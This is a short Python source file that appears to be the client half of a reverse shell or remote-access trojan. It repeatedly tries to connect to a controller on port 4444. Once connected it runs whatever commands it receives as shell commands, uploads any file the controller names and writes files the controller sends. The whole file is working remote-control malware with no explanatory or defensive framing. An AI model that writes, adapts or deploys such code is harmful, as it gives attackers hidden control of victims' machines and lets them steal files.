import socket
import os
import time
import utils

class Client():

    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def _handle_server(self):

        while self.sock:

            command = utils._receive(self.sock)

            if not command:
                continue

            if command == 'PING':
                utils._send(self.sock, "PONG")

            elif "kill yourself" == command:
                self.sock.close()
                return

            elif "download" == command[:8]:

                requested_file = os.path.abspath((command[8:]).strip(' '))

                if utils._does_file_exists(requested_file):
                    utils._send_file(self.sock, requested_file)

                else:
                    utils._send(self.sock, f"[!] File {requested_file} does not exists.")

            elif "upload" == command[:6]:

                cmds = command.split(' ')

                file = os.path.join(cmds[2], cmds[1])

                if not os.path.exists(cmds[2]):
                    utils._send(self.sock, f"[!] Path {cmds[2]} does not exists.")
                    return
                
                data = utils._receive(self.sock)

                utils._write_file(file, data)
            
            else:
                result = utils._exec_command(command)
                utils._send(self.sock, result)

    def connect(self, ip, port):

        while True:
            try:
                self.sock.connect((ip, port))
                break
            except ConnectionRefusedError:
                time.sleep(5)

        self._handle_server()


if __name__ == "__main__":
    server = Client()
    server.connect("127.0.0.1", 4444)